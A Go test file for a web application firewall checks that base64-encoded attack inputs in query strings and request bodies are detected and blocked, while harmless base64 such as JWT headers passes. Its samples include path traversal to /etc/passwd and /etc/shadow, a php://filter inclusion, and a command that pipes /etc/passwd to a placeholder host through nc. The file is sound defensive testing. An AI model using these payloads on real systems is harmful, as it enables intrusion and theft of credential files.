package inspect

import (
	"encoding/base64"
	"net/url"
	"strings"
	"testing"
)

// A traversal, a file inclusion or a command sent as base64 in the URL or in
// a body argument is decoded and blocked; base64 the injection rules would
// misread (a JWT header, a word) is left alone, and so are headers.
func TestBase64Values(t *testing.T) {
	std := base64.StdEncoding.EncodeToString
	rawURL := base64.RawURLEncoding.EncodeToString
	get := func(q string) string {
		return "GET http://shop.example/p?" + q + " HTTP/1.1\r\nHost: shop.example\r\n\r\n"
	}
	for name, raw := range map[string]string{
		"padded, escaped":       get("f=" + url.QueryEscape(std([]byte("../../../etc/passwd")))),
		"padded, plain":         get("f=" + std([]byte("../../etc/passwd%00"))),
		"url-safe, unpadded":    get("f=" + rawURL([]byte("php://filter/convert.base64-encode/resource=index.php"))),
		"form body":             post("application/x-www-form-urlencoded", "q=shoes&page="+url.QueryEscape(std([]byte("..\\..\\windows\\win.ini")))),
		"json body":             post("application/json", `{"file":"`+std([]byte("../../etc/shadow"))+`"}`),
		"nul after the path":    get("f=" + url.QueryEscape(std([]byte("../../etc/passwd\x00")))),
		"after 4 KiB of spaces": get("c=" + url.QueryEscape(std([]byte(strings.Repeat(" ", 4096)+"; cat /etc/passwd")))),
		"after decoys":          get(strings.Repeat("w=forecast&", 100) + "f=" + url.QueryEscape(std([]byte("../../etc/passwd")))),
		"command":               get("c=" + url.QueryEscape(std([]byte("x; cat /etc/passwd | nc evil.example 4444")))),
	} {
		in, _ := Evaluate(newEngine(), nil, nil, req(t, raw), "192.0.2.1")
		if !in.WouldBlock() {
			t.Errorf("%s: not blocked: %v", name, in.Matches)
		}
	}
	for name, raw := range map[string]string{
		"jwt header":           get("t=" + rawURL([]byte(`{"alg":"HS256","typ":"JWT"}`)) + ".e30.sig"),
		"sql, not read":        get("q=" + url.QueryEscape(std([]byte("' or 1=1 --")))),
		"words":                get("ntc=QmVqYXIrNTIr&id=MjY2MTQ5MTc5MjA5ODQ1Nw%3D%3D"),
		"bytes, two backticks": get("img=" + url.QueryEscape(std([]byte("\x89PNG\x01`\x02\x93$(\x7f)\x04`\x05")))),
		"header":               "GET http://shop.example/ HTTP/1.1\r\nHost: shop.example\r\nX-Data: " + std([]byte("../../etc/passwd")) + "\r\n\r\n",
		"text/plain":           post("text/plain", std([]byte("../../etc/passwd"))),
	} {
		in, _ := Evaluate(newEngine(), nil, nil, req(t, raw), "192.0.2.1")
		if in.WouldBlock() {
			t.Errorf("%s: blocked: %v", name, in.Matches)
		}
	}
}
